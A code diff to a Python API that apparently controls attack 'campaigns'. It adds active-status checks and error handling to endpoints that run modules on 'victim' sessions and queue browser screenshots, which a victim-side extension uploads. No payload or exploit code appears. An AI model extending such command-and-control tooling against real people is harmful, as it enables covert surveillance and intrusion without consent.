@@ -6,6 +6,7 @@ from .campaign_common import (
     APIRouter,
     BackgroundTask,
     Campaign,
+    CampaignStatus,
     CampaignModuleRequest,
     CommandRequest,
     Depends,
@@ -498,6 +499,14 @@ async def execute_module(
     if not victim:
         raise HTTPException(404, "Victim not found")
 
+    if campaign.status != CampaignStatus.active:
+        raise HTTPException(
+            409,
+            f"Campaign is not active (status: {campaign.status.value}). "
+            "Modules can only run while the campaign is active — "
+            "create a new campaign or resume this one.",
+        )
+
     # ✅ Send request to internal campaign API
     internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/execute-module"
     headers = campaign_internal_headers(campaign_id)
@@ -510,13 +519,33 @@ async def execute_module(
                 json={"module_id": module_id, "params": params},
                 timeout=10.0
             )
-            response.raise_for_status()
+        except httpx.ConnectError as exc:
+            logger.warning(
+                "Campaign module service unreachable for %s: %s",
+                campaign_id,
+                exc,
+            )
+            raise HTTPException(
+                502,
+                "Campaign service is unreachable — its container is not "
+                "running. The campaign may have completed; create a new one.",
+            ) from exc
         except httpx.HTTPError as exc:
             logger.exception("Campaign module service request failed")
             raise HTTPException(
                 502,
                 "Campaign service request failed",
             ) from exc
+        if response.status_code >= 400:
+            detail = None
+            try:
+                detail = response.json().get("detail")
+            except ValueError:
+                pass
+            raise HTTPException(
+                409 if response.status_code == 404 else 502,
+                detail or "Campaign module execution was rejected",
+            )
 
     logger.info(
         "Module %s executed on victim %s in campaign %s (by %s)",
@@ -552,6 +581,13 @@ async def capture_snapshot(
     if not victim:
         raise HTTPException(404, "Victim not found")
 
+    if campaign.status != CampaignStatus.active:
+        raise HTTPException(
+            409,
+            f"Campaign is not active (status: {campaign.status.value}). "
+            "Snapshots can only be captured while the campaign is active.",
+        )
+
     # ✅ Register the request with the internal campaign API; the victim's
     # browser extension polls for it and uploads the captured PNG.
     internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/snapshot-requests"
@@ -564,13 +600,33 @@ async def capture_snapshot(
                 headers=headers,
                 timeout=10.0
             )
-            response.raise_for_status()
+        except httpx.ConnectError as exc:
+            logger.warning(
+                "Campaign snapshot service unreachable for %s: %s",
+                campaign_id,
+                exc,
+            )
+            raise HTTPException(
+                502,
+                "Campaign service is unreachable — its container is not "
+                "running. The campaign may have completed; create a new one.",
+            ) from exc
         except httpx.HTTPError as exc:
             logger.exception("Campaign snapshot service request failed")
             raise HTTPException(
                 502,
                 "Campaign service request failed",
             ) from exc
+        if response.status_code >= 400:
+            detail = None
+            try:
+                detail = response.json().get("detail")
+            except ValueError:
+                pass
+            raise HTTPException(
+                409 if response.status_code == 404 else 502,
+                detail or "Snapshot request was rejected",
+            )
 
     request_id = response.json().get("request_id")
 
